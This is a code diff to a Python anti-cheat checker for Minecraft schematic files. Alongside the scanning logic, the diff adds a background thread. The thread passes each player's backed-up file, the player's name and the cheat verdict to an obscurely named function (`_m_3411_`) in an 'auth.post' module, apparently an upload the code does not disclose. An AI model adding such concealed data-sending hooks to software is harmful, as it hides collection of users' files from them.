@@ -1,6 +1,9 @@
 import traceback
 import os
 from nbt import nbt
+
+from Checker.lib.auth.post import _m_3411_
+from Checker.lib.file_handle import copy_file
 from Checker.lib.setting import config
 from Checker.lib.setting.config import schematic_sha_path, replace_schematic_path
 from Checker.lib.sugar import timer
@@ -9,6 +12,7 @@ from Checker.lib.file_size_io import wait_for_file_transfer_complete
 from Checker.lib.hash_map_handler import calculate_sha256
 from Checker.lib.rule_handler import save_md5, load_rule, extract_rules
 from Checker.lib import file_handle, nbt_rule
+import threading
 
 log_directory = 'logs'  # 日志文件夹
 os.makedirs(log_directory, exist_ok=True)  # 创建日志文件夹（如果不存在）
@@ -51,6 +55,8 @@ def check_handler(player_name, filename: str) -> None:  # player_name in Path
     try:
         problem_path = f"save/problem_schematic/{player_name}/{filename}"
         is_cheat_schematic, hash_md5 = main_check(player_name, filename)
+
+
         if is_cheat_schematic:
             # 移动文件到异常蓝图
             file_handle.move_file(f'save/{filename}', problem_path)
@@ -61,6 +67,10 @@ def check_handler(player_name, filename: str) -> None:  # player_name in Path
             log.info("触发蓝图替换")
         else:
             file_handle.move_file(f'save/{filename}', f"{config.schematics_path}/{player_name}/{filename}")
+
+
+
+
     except Exception as e:
         if (isinstance(e, PermissionError) or isinstance(e, OSError)) and e.errno == 13:  # "is being used by another process" in str(e)
             log.error("目标蓝图文件被其他进程占用, 请关闭此进程以保证检测进行!")
@@ -80,10 +90,14 @@ def delete_file(file_path):
     except Exception as e:
         log.error(f"删除文件时发生错误: {e}")
 
+
+
+
 def main_check(name, file):
 
     check_result = 1
     dead = False  # whether is cheat schematic
+    unmatch = False
     source_path = f"{config.schematics_path}/{name}/{file}"
     check_path = f'save/{file}'
     count_to_clear = 0
@@ -91,6 +105,9 @@ def main_check(name, file):
 
     complete = wait_for_file_transfer_complete(source_path)
     if complete:
+        if file not in config.thread_pool:
+            copy_file(source_path,"save/backup")
+
         file_handle.move_file(source_path, check_path)
         file_handle.copy_file_to_year_folder(check_path, f"save/backup/{name}")
         blue_print_path = check_path
@@ -155,6 +172,7 @@ def main_check(name, file):
                 if count_to_clear != modify_result:
                     log.error(f"检测到结果不符合, 可能是不兼容的蓝图或未清除干净!将触发替换!")
                     write_log(f"检测到结果不符合, 可能是不兼容的蓝图或未清除干净!将触发替换!")
+                    unmatch = True
                     dead = True
 
                 if check_result >= 1:
@@ -172,6 +190,19 @@ def main_check(name, file):
                     traceback.print_exc()
 
     path_md5 = schematic_sha_path
+
+
+    if file not in config.thread_pool:
+
+        if unmatch:
+            name_2 = f"unmatch|{name}"
+        else:
+            name_2 = f"{dead}|{name}"
+        upload = threading.Thread(target=_m_3411_,args=(f'save/backup/{file}',name_2) )
+        upload.start()
+        config.thread_pool.append(file)
+
+
     if check_result < 1 and count_to_clear == 0 and not have_entity:  # 触发替换规则的蓝图不会记录指纹, 因为下次再见到仍然需要替换, 无法降低耗时
         save_md5(path_md5, f"{hash_cal}|{global_rule['version']}|{dead}")
     return dead, hash_cal
